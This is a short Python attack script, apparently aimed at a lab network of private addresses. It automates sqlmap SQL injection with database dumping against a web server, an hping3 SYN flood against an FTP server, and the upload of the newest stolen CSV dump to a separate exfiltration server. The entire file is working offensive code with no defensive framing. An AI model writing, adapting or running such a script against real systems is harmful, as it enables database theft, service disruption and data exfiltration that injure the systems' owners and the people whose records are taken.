import requests
import os

EXFIL_SERVER = "http://192.168.30.14:5000/upload"
TARGET_FTP = "192.168.30.12"
TARGET_WEB = "http://192.168.30.11"
TARGET_MYSQL = "192.168.30.13"
DUMP_PATH = "/root/dump"

def attack_web():
    print("[*] Attacking Web Server...")
    os.system(f"sqlmap -u {TARGET_WEB} --forms --batch --dump --output-dir=/root/dump")

def ftp_dos():
    print("[*] Launching DoS attack on FTP...")
    os.system(f"hping3 -S -p 21 -c 200 {TARGET_FTP}")

def exfiltrate_data():
    print("[*] Exfiltrating Database Dump...")
    # List files in the directory
    dump_files = [f for f in os.listdir(DUMP_PATH) if f.endswith(".csv")]

    if not dump_files:
        print("[!] No SQL dump file found!")
        return

    # Get the most recent dump file
    dump_files.sort(key=lambda f: os.path.getmtime(os.path.join(DUMP_PATH, f)), reverse=True)
    dump_file = dump_files[0]

    file_path = os.path.join(DUMP_PATH, dump_file)
    print(f"[*] Exfiltrating {file_path}...")

    with open(file_path, "rb") as file:
        requests.post(EXFIL_SERVER, files={"file": file})

    print("[+] Data Exfiltrated!")


if __name__ == "__main__":
    attack_web()
    ftp_dos()
    exfiltrate_data()
